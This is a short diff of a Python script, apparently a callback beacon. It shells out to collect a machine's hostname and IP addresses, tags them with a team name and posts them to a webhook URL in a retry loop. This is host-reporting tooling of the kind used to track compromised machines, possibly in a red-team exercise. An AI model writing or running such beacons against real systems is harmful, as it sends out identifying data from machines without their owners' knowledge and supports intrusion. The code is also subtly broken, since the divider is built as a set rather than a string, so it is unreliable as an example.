@@ -23,6 +23,11 @@ data = {"content": f"{DIVIDER}\nid:\n\t{TEAM_NAME}|{hostname} \nip:\n\t{ipaddrs}
 
 for _ in range(10):
     try:
+        hostname = clean_output(subprocess.check_output(hostname_cmd, shell=True))
+        ipaddrs = clean_output(subprocess.check_output(ip_command, shell=True))
+        DIVIDER = {"-" * 32}
+
+        data = {"content": f"{DIVIDER}\nid:\n\t{TEAM_NAME}|{hostname} \nip:\n\t{ipaddrs}\n{DIVIDER}"}
         response = requests.post(webhook_url, json=data)
         break
     except:
